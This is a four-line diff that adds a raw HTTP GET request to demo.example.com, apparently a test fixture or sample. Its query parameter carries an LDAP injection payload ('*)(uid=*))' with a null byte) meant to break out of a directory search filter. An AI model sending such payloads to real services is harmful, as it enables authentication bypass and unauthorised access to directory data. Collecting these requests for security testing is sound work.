@@ -1,0 +1,4 @@
+GET /a?q="*)(uid%3D*))%00" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
